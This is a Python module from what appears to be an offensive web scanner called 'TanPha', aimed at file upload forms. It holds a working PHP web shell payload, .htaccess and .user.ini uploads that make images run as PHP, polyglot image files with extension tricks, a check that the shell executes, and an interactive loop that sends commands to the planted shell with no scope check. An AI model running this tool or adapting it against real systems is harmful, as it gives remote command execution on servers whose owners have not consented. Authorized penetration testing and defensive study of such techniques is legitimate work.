"""File Upload Module for TanPha V3 (Global Multi-Strategy Bypass + Execution Verify)."""
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse, urljoin
import random
import string
import re


class UploadModule(BaseModule):
    name = "FileUpload"
    module_id = "upload"
    version = "4.4 (Global Execution Verify)"
    vulnerability_class = "FILE_UPLOAD"
    default_impact = "REMOTE_CODE_EXECUTION"
    default_privilege = "WEB_USER"

    def can_run(self, context: TargetContext) -> bool:
        return True 

    def _find_upload_path(self, response_text: str, p_name: str, target_url: str) -> list[str]:
        possible_paths = set()
        matches = re.findall(r'([\.\/\w\-]*' + re.escape(p_name) + r')', response_text)
        for m in matches:
            possible_paths.add(urljoin(target_url, m))
            
        if not possible_paths:
            base = target_url.rsplit('/', 1)[0] + "/"
            common_dirs = ["uploads/", "files/", "images/", "assets/", "media/", "content/", "public/", "tmp/"]
            for d in common_dirs:
                possible_paths.add(base + d + p_name)
                possible_paths.add(urljoin(target_url, "/" + d + p_name))
                
        return list(possible_paths)

    def _detect_form(self, context):
        params = context.discovery.parameters
        file_field = None
        submit_field = "Submit"
        submit_val = "Submit"
        
        file_keywords = ["file", "uploaded", "image", "avatar", "photo", "picture", "document", "media", "attachment"]
        
        for p in params:
            if p == "MAX_FILE_SIZE": continue
            is_submit = any(k in p.lower() for k in ["submit", "go", "btn"]) or p == "Upload"
            
            if not is_submit:
                if any(k in p.lower() for k in file_keywords) or file_field is None:
                    file_field = p
            else:
                submit_field = p
                submit_val = p
                
        return file_field, submit_field, submit_val

    def _is_shell_executing(self, context, url, scope_checker):
        """Check if the file is actually executed as PHP, not just reflected."""
        res = context.http_client.request("GET", url, scope_checker=scope_checker, bypass_mutation=True)
        if res.success and res.response:
            # 1337 * 1337 = 1787569
            return "1787569" in res.response.text
        return False

    def _upload_and_verify(self, context, file_field, submit_field, submit_val, p_name, file_data, mime_type, scope_checker):
        files = {file_field: (p_name, file_data, mime_type)}
        data = {"MAX_FILE_SIZE": "100000", submit_field: submit_val}
        
        result = context.http_client.request(
            "POST", context.target.base_url, 
            files=files, data=data, 
            scope_checker=scope_checker, bypass_mutation=True
        )
        
        if result.success and result.response:
            if p_name in result.response.text:
                possible_urls = self._find_upload_path(result.response.text, p_name, context.target.base_url)
                for u in possible_urls:
                    if self._is_shell_executing(context, u, scope_checker):
                        return Evidence(
                            attempt_id="up_001", module_id=self.module_id, module_version=self.version,
                            location=u, parameter=file_field, outcome="CHANGED_RESPONSE",
                            reason_code="UPLOAD_EXECUTED", reason_detail="Strategy worked and PHP executed",
                            confidence=0.95, evidence_text=f"Uploaded {p_name}", assess_payload=p_name
                        )
        return None

    def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
        file_field, submit_field, submit_val = self._detect_form(context)
        if not file_field:
            print("      [-] No file input field detected.")
            return []

        print(f"      [>] Form detected. File Field: '{file_field}', Submit: '{submit_field}'")

        # PHP payload to test execution (not just echo text)
        php_code = b"<?php echo (1337*1337); system($_POST['cmd']); ?>"

        # ==========================================================
        # STRATEGY 1: Config File Injection (Bypass High / Real World)
        # ==========================================================
        print("      [>] Strategy 1: Config File Injection (.htaccess / .user.ini)")
        
        config_payloads = [
            {"name": ".htaccess", "content": b"AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png\n", "mime": "text/plain"},
            {"name": ".user.ini", "content": b"auto_prepend_file=tnp_shell.jpg\n", "mime": "text/plain"}
        ]
        
        for cfg in config_payloads:
            print(f"          [*] Trying to upload {cfg['name']}...")
            res = context.http_client.request(
                "POST", context.target.base_url,
                files={file_field: (cfg['name'], cfg['content'], cfg['mime'])},
                data={"MAX_FILE_SIZE": "100000", submit_field: submit_val},
                scope_checker=scope_checker, bypass_mutation=True
            )
            if res.success and res.response and cfg['name'] in res.response.text:
                print(f"          [+] {cfg['name']} uploaded! Now uploading shell.jpg...")
                
                rand_name = ''.join(random.choices(string.ascii_lowercase, k=5))
                p_name = f"tnp_{rand_name}.jpg"
                polyglot = b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + b"\n" + php_code
                
                ev = self._upload_and_verify(context, file_field, submit_field, submit_val, p_name, polyglot, "image/jpeg", scope_checker)
                if ev:
                    print(f"      [+] Strategy 1 SUCCESS! Shell EXECUTED.")
                    return [ev]

        # ==========================================================
        # STRATEGY 2: Polyglot Standard (Bypass Low / Medium)
        # ==========================================================
        print("      [>] Strategy 2: Standard Polyglot Upload (Fallback)")
        
        polyglots = [
            {"data": b"GIF89a;\n" + php_code, "mime": "image/gif"},
            {"data": b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + b"\n" + php_code, "mime": "image/jpeg"},
            {"data": b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x00IEND\xaeB`\x82\n" + php_code, "mime": "image/png"}
        ]
        
        ext_variants = [".php", ".phtml", ".php5", ".phar", ".php.jpg", ".jpg.php", ".jpg"]
        
        for pg in polyglots:
            for ext in ext_variants:
                rand_name = ''.join(random.choices(string.ascii_lowercase, k=5))
                p_name = f"tnp_{rand_name}{ext}"
                
                print(f"          [*] Trying {pg['mime']} -> {p_name}...")
                ev = self._upload_and_verify(context, file_field, submit_field, submit_val, p_name, pg["data"], pg["mime"], scope_checker)
                if ev:
                    print(f"      [+] Strategy 2 SUCCESS! Shell EXECUTED.")
                    return [ev]

        print("      [-] All upload strategies failed or PHP not executing (High security re-encodes images).")
        return []

    def verify(self, context: TargetContext, evidence: Evidence, scope_checker=None) -> VerificationResult:
        print(f"      [*] Verifying Shell EXECUTION at: {evidence.location}")
        if self._is_shell_executing(context, evidence.location, scope_checker):
            print("      [+] VERIFIED! Shell is executing PHP.")
            return VerificationResult(VerificationStatus.VALIDATED, 0.95, "SHELL_EXECUTING", "PHP executed successfully", verify_payload="")
                
        print("      [-] FALSE POSITIVE. Shell uploaded but PHP is not executing (raw code).")
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "SHELL_NOT_EXECUTING", "PHP not executed")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] ACTIVATING UPLOAD SHELL [***]")
        print(f"[*] Shell URL: {finding.location}")
        print("[*] Type commands (e.g., 'id', 'ls') or 'exit' to leave.\n")
        
        while True:
            try:
                cmd = input("TanPha-UploadShell> ").strip()
                if cmd.lower() in ("exit", "quit"): break
                if not cmd: continue
                
                marker_start = "TANPHA_OUT_START"
                marker_end = "TANPHA_OUT_END"
                wrapped_cmd = f"echo {marker_start}; {cmd}; echo {marker_end}"
                
                res = context.http_client.request("POST", finding.location, data={"cmd": wrapped_cmd}, scope_checker=None, bypass_mutation=True)
                
                if res.success and res.response:
                    raw = res.response.text
                    if marker_start in raw and marker_end in raw:
                        output = raw.split(marker_start)[1].split(marker_end)[0].strip()
                        print(f"\n{output}\n")
                    else:
                        print(f"\n[!] Marker not found. Raw output: {raw.strip()[:300]}\n")
                else:
                    print("[-] Shell is not responding.")
            except KeyboardInterrupt:
                print("\n[*] Exiting shell.")
                break
